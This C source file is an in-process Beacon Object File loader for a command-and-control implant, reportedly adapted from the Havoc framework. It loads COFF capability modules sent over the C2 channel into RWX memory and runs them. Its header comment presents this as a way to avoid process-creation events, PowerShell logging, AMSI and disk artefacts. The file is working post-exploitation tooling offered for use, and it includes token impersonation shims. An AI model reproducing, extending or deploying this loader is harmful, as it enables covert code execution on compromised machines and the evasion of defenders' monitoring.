/**
 * bof_loader.c — In-process COFF/BOF (Beacon Object File) loader
 *
 * Borrowed and adapted from HavocFramework/Havoc (MIT licence)
 * Source: payloads/Demon/src/core/CoffeeLdr.c  (853 lines)
 *
 * What this enables:
 *   Instead of dispatching plugins via `powershell.exe -c "Add-Type ..."`,
 *   the operator compiles capability as a BOF (COFF object file) and sends
 *   the raw bytes over the C2 channel.  The BOF runs in-process:
 *     - No new process spawned  → no process creation event
 *     - No PowerShell.exe       → no ScriptBlock logging, no AMSI on PS
 *     - No disk write           → no file creation event
 *     - Runs in implant memory  → no unbacked executable memory in child
 *
 * Beacon API compatibility:
 *   BOFs compiled for Cobalt Strike's Beacon or Havoc's Demon work here.
 *   The loader resolves __imp_Beacon* symbols to our Beacon API shims.
 *
 * BOF execution flow:
 *   1. BofLoad()    — parse COFF sections, allocate RWX, apply relocations
 *   2. BofResolve() — resolve all external symbols (__imp_* and Win32)
 *   3. BofRun()     — call the BOF's go() entry point
 *   4. BofFree()    — unmap and free the BOF image
 *
 * MITRE: T1620 (Reflective Code Loading)
 */

#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdarg.h>

/* ── COFF structures ─────────────────────────────────────────────────────── */

#pragma pack(push, 1)
typedef struct {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} COFF_FILE_HEADER;

typedef struct {
    BYTE  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} COFF_SECTION;

typedef struct {
    union { DWORD LongName; BYTE ShortName[8]; } N;
    DWORD Value;
    SHORT SectionNumber;
    WORD  Type;
    BYTE  StorageClass;
    BYTE  NumberOfAuxSymbols;
} COFF_SYMBOL;

typedef struct {
    DWORD VirtualAddress;
    DWORD SymbolTableIndex;
    WORD  Type;
} COFF_RELOC;
#pragma pack(pop)

#define COFF_MACHINE_AMD64  0x8664
#define COFF_MACHINE_I386   0x14C
#define IMAGE_REL_AMD64_ADDR64  0x0001
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#define IMAGE_REL_AMD64_REL32   0x0004

/* Storage class */
#define COFF_SYM_EXTERNAL   2
#define COFF_SYM_STATIC     3

/* BOF Beacon API prefix hashes */
#define COFF_PREP_SYMBOL    0xec6ba2a8   /* __imp_ */
#define COFF_PREP_BEACON    0xd0a409b0   /* __imp_Beacon */

/* ── Hash function (djb2) ────────────────────────────────────────────────── */

static uint32_t _hash(const char *s)
{
    uint32_t h = 5381;
    while (*s) h = h * 33 ^ (uint8_t)*s++;
    return h;
}

/* ── BOF image ───────────────────────────────────────────────────────────── */

typedef struct {
    PVOID   ImageBase;
    SIZE_T  ImageSize;
    PVOID  *SectionBases;
    DWORD   SectionCount;
    BOOL    Loaded;
} BOF_IMAGE;

/* ── Beacon API shims ─────────────────────────────────────────────────────
 * These are the functions BOFs call via the Beacon* API.
 * Output is accumulated in a heap buffer and returned to the operator.
 * ─────────────────────────────────────────────────────────────────────── */

static char  *g_BofOutput     = NULL;
static SIZE_T g_BofOutputLen  = 0;
static SIZE_T g_BofOutputCap  = 0;

static void _bof_append(const char *data, SIZE_T len)
{
    if (g_BofOutputLen + len + 1 > g_BofOutputCap) {
        g_BofOutputCap = (g_BofOutputLen + len + 1) * 2 + 4096;
        g_BofOutput    = (char *)LocalReAlloc(g_BofOutput, g_BofOutputCap, LMEM_MOVEABLE);
    }
    if (g_BofOutput) {
        memcpy(g_BofOutput + g_BofOutputLen, data, len);
        g_BofOutputLen += len;
        g_BofOutput[g_BofOutputLen] = 0;
    }
}

/* BeaconPrintf — format string output */
void BeaconPrintf(int type, const char *fmt, ...)
{
    char buf[4096] = { 0 };
    va_list va; va_start(va, fmt);
    vsnprintf(buf, sizeof(buf)-1, fmt, va);
    va_end(va);
    _bof_append(buf, strlen(buf));
}

/* BeaconOutput — raw bytes output */
void BeaconOutput(int type, const char *data, int len)
{
    _bof_append(data, (SIZE_T)len);
}

/* BeaconDataParse / BeaconDataInt / BeaconDataShort / BeaconDataExtract */
typedef struct { char *original; char *buffer; int length; int size; } DATAP;

void BeaconDataParse(DATAP *p, char *data, int sz)
{ p->original = p->buffer = data; p->length = p->size = sz; }

int BeaconDataInt(DATAP *p) {
    if (p->length < 4) return 0;
    int v = *(int *)p->buffer;
    p->buffer += 4; p->length -= 4;
    return v;
}
short BeaconDataShort(DATAP *p) {
    if (p->length < 2) return 0;
    short v = *(short *)p->buffer;
    p->buffer += 2; p->length -= 2;
    return v;
}
char *BeaconDataExtract(DATAP *p, int *sz) {
    if (p->length < 4) return NULL;
    int len = *(int *)p->buffer; p->buffer += 4; p->length -= 4;
    if (p->length < len) return NULL;
    char *v = p->buffer; p->buffer += len; p->length -= len;
    if (sz) *sz = len;
    return v;
}
int BeaconDataLength(DATAP *p) { return p->length; }

/* BeaconGetSpawnTo — return default host process path */
BOOL BeaconGetSpawnTo(BOOL x86, char *buf, int len)
{ return GetModuleFileNameA(NULL, buf, len) > 0; }

/* BeaconIsAdmin */
BOOL BeaconIsAdmin(void)
{
    BOOL admin = FALSE;
    HANDLE tok = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        TOKEN_ELEVATION elev = { 0 };
        DWORD len = 0;
        GetTokenInformation(tok, TokenElevation, &elev, sizeof(elev), &len);
        admin = elev.TokenIsElevated;
        CloseHandle(tok);
    }
    return admin;
}

/* BeaconUseToken / BeaconRevertToken — stub impersonation */
BOOL BeaconUseToken(HANDLE tok) { return ImpersonateLoggedOnUser(tok); }
void BeaconRevertToken(void)    { RevertToSelf(); }

/* BeaconInjectProcess — stub (full injection handled by injection plugins) */
void BeaconInjectProcess(HANDLE hProc, int pid, char *dll, int offset,
                         int x86, char *args, int alen) { (void)hProc; }

/* ── Beacon API dispatch table ───────────────────────────────────────────── */

typedef struct { const char *name; PVOID func; } BEACON_API;
static const BEACON_API g_BeaconApi[] = {
    { "BeaconPrintf",        BeaconPrintf        },
    { "BeaconOutput",        BeaconOutput        },
    { "BeaconDataParse",     BeaconDataParse     },
    { "BeaconDataInt",       BeaconDataInt       },
    { "BeaconDataShort",     BeaconDataShort     },
    { "BeaconDataExtract",   BeaconDataExtract   },
    { "BeaconDataLength",    BeaconDataLength    },
    { "BeaconGetSpawnTo",    BeaconGetSpawnTo    },
    { "BeaconIsAdmin",       BeaconIsAdmin       },
    { "BeaconUseToken",      BeaconUseToken      },
    { "BeaconRevertToken",   BeaconRevertToken   },
    { "BeaconInjectProcess", BeaconInjectProcess },
    { NULL, NULL }
};

static PVOID _resolve_beacon_api(const char *name)
{
    for (int i = 0; g_BeaconApi[i].name; i++)
        if (strcmp(g_BeaconApi[i].name, name) == 0)
            return g_BeaconApi[i].func;
    return NULL;
}

/* ── Win32 API resolver ──────────────────────────────────────────────────── */

static PVOID _resolve_win32(const char *dll_name, const char *func_name)
{
    /* Convert dll_name to wide */
    wchar_t wdll[128] = { 0 };
    for (int i = 0; dll_name[i] && i < 127; i++) wdll[i] = (wchar_t)dll_name[i];

    HMODULE h = GetModuleHandleW(wdll);
    if (!h) h = LoadLibraryW(wdll);
    if (!h) return NULL;
    return GetProcAddress(h, func_name);
}

/* ── Symbol resolver ─────────────────────────────────────────────────────── */

static PVOID _resolve_symbol(const char *sym)
{
    /* Format: __imp_<DLL>$<Function>  or  __imp_Beacon<Function>
       e.g.  __imp_KERNEL32$VirtualAlloc
             __imp_BeaconPrintf                                      */

    const char *imp = strstr(sym, "__imp_");
    if (!imp) return NULL;
    imp += 6;  /* skip __imp_ */

    /* Beacon API */
    if (strncmp(imp, "Beacon", 6) == 0) {
        PVOID fn = _resolve_beacon_api(imp);
        if (fn) return fn;
    }

    /* Win32: split at '$' */
    const char *dollar = strchr(imp, '$');
    if (dollar) {
        char dll[64] = { 0 };
        char func[128] = { 0 };
        size_t dlen = (size_t)(dollar - imp);
        if (dlen >= sizeof(dll)) return NULL;
        memcpy(dll, imp, dlen);
        /* append .dll if not present */
        if (!strstr(dll, ".")) strcat(dll, ".dll");
        strncpy(func, dollar + 1, sizeof(func)-1);
        return _resolve_win32(dll, func);
    }

    return NULL;
}

/* ── Loader ──────────────────────────────────────────────────────────────── */

typedef VOID (*BOF_ENTRY)(char *args, int alen);

typedef struct {
    BOF_IMAGE  Image;
    BOF_ENTRY  Entry;
    char      *Output;
    SIZE_T     OutputLen;
} BOF_CTX;

/**
 * BofLoad — parse COFF, allocate RWX memory, copy sections, apply relocations.
 */
static BOOL _bof_load(const BYTE *coff_data, SIZE_T coff_size, BOF_CTX *ctx)
{
    if (!coff_data || coff_size < sizeof(COFF_FILE_HEADER)) return FALSE;

    COFF_FILE_HEADER *hdr = (COFF_FILE_HEADER *)coff_data;
    if (hdr->Machine != COFF_MACHINE_AMD64) return FALSE;  /* x64 only */

    COFF_SECTION *sections = (COFF_SECTION *)(coff_data + sizeof(COFF_FILE_HEADER));
    COFF_SYMBOL  *symtab   = (COFF_SYMBOL  *)(coff_data + hdr->PointerToSymbolTable);
    const char   *strtab   = (const char   *)(symtab + hdr->NumberOfSymbols);

    DWORD nsec = hdr->NumberOfSections;

    /* Allocate section bases array */
    ctx->Image.SectionCount = nsec;
    ctx->Image.SectionBases = (PVOID *)LocalAlloc(LPTR, nsec * sizeof(PVOID));
    if (!ctx->Image.SectionBases) return FALSE;

    /* Allocate RWX for each section */
    for (DWORD i = 0; i < nsec; i++) {
        DWORD sz = sections[i].SizeOfRawData;
        if (!sz) continue;
        ctx->Image.SectionBases[i] = VirtualAlloc(NULL, sz,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!ctx->Image.SectionBases[i]) return FALSE;
        if (sections[i].PointerToRawData)
            memcpy(ctx->Image.SectionBases[i],
                   coff_data + sections[i].PointerToRawData, sz);
    }

    /* Apply relocations */
    for (DWORD i = 0; i < nsec; i++) {
        if (!sections[i].NumberOfRelocations) continue;
        if (!ctx->Image.SectionBases[i]) continue;

        COFF_RELOC *relocs = (COFF_RELOC *)(coff_data + sections[i].PointerToRelocations);
        BYTE *sec_base = (BYTE *)ctx->Image.SectionBases[i];

        for (WORD r = 0; r < sections[i].NumberOfRelocations; r++) {
            COFF_RELOC  *rel  = &relocs[r];
            COFF_SYMBOL *sym  = &symtab[rel->SymbolTableIndex];
            BYTE        *patch = sec_base + rel->VirtualAddress;

            PVOID sym_addr = NULL;

            if (sym->SectionNumber > 0) {
                /* Internal symbol — address within one of our sections */
                int sec_idx = sym->SectionNumber - 1;
                if (sec_idx < (int)nsec && ctx->Image.SectionBases[sec_idx])
                    sym_addr = (BYTE *)ctx->Image.SectionBases[sec_idx] + sym->Value;
            } else if (sym->SectionNumber == 0 && sym->StorageClass == COFF_SYM_EXTERNAL) {
                /* External symbol — resolve by name */
                const char *sym_name;
                char tmp[256] = { 0 };
                if (*(DWORD *)sym->N.ShortName == 0) {
                    sym_name = strtab + sym->N.LongName;
                } else {
                    memcpy(tmp, sym->N.ShortName, 8);
                    sym_name = tmp;
                }
                sym_addr = _resolve_symbol(sym_name);
            }

            if (!sym_addr) continue;

            switch (rel->Type) {
            case IMAGE_REL_AMD64_ADDR64:
                *(UINT64 *)patch = (UINT64)sym_addr;
                break;
            case IMAGE_REL_AMD64_ADDR32NB:
                *(UINT32 *)patch = (UINT32)((BYTE *)sym_addr -
                                            (patch + 4));
                break;
            case IMAGE_REL_AMD64_REL32:
                *(INT32 *)patch = (INT32)((BYTE *)sym_addr - (patch + 4));
                break;
            default:
                break;
            }
        }
    }

    /* Find entry point: look for symbol named "go" */
    for (DWORD i = 0; i < hdr->NumberOfSymbols; i++) {
        COFF_SYMBOL *sym = &symtab[i];
        const char  *sym_name;
        char tmp[256] = { 0 };
        if (*(DWORD *)sym->N.ShortName == 0)
            sym_name = strtab + sym->N.LongName;
        else {
            memcpy(tmp, sym->N.ShortName, 8);
            sym_name = tmp;
        }

        if (strcmp(sym_name, "go") == 0 && sym->SectionNumber > 0) {
            int sec_idx = sym->SectionNumber - 1;
            if (sec_idx < (int)nsec && ctx->Image.SectionBases[sec_idx])
                ctx->Entry = (BOF_ENTRY)((BYTE *)ctx->Image.SectionBases[sec_idx]
                                         + sym->Value);
            break;
        }
        /* skip aux symbols */
        i += sym->NumberOfAuxSymbols;
    }

    ctx->Image.Loaded = TRUE;
    return ctx->Entry != NULL;
}

static void _bof_free(BOF_CTX *ctx)
{
    if (!ctx->Image.SectionBases) return;
    for (DWORD i = 0; i < ctx->Image.SectionCount; i++)
        if (ctx->Image.SectionBases[i])
            VirtualFree(ctx->Image.SectionBases[i], 0, MEM_RELEASE);
    LocalFree(ctx->Image.SectionBases);
    ctx->Image.SectionBases = NULL;
    ctx->Image.Loaded = FALSE;
}

/* ── Public API ──────────────────────────────────────────────────────────── */

/**
 * BofExecute — load a COFF BOF, run its go() entry, return output.
 *
 * @param coff_data   Raw COFF bytes (from C2 or file)
 * @param coff_size   Length of coff_data
 * @param args        Argument pack (DATAP-formatted, may be NULL)
 * @param args_len    Length of args
 * @param out_buf     Receives pointer to output buffer (caller must LocalFree)
 * @param out_len     Receives output length
 * @return TRUE on success
 */
BOOL BofExecute(
    const BYTE *coff_data, SIZE_T coff_size,
    char *args, int args_len,
    char **out_buf, SIZE_T *out_len)
{
    BOF_CTX ctx = { 0 };

    /* Reset output buffer */
    if (g_BofOutput) { LocalFree(g_BofOutput); g_BofOutput = NULL; }
    g_BofOutputLen = g_BofOutputCap = 0;

    if (!_bof_load(coff_data, coff_size, &ctx)) {
        _bof_free(&ctx);
        return FALSE;
    }

    /* VEH to catch BOF exceptions (don't crash the implant) */
    __try {
        ctx.Entry(args, args_len);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        BeaconPrintf(0, "[!] BOF exception: 0x%08X\n",
                     GetExceptionCode());
    }

    _bof_free(&ctx);

    if (out_buf) *out_buf = g_BofOutput;
    if (out_len) *out_len = g_BofOutputLen;

    /* Transfer ownership — caller must LocalFree */
    g_BofOutput    = NULL;
    g_BofOutputLen = g_BofOutputCap = 0;

    return TRUE;
}
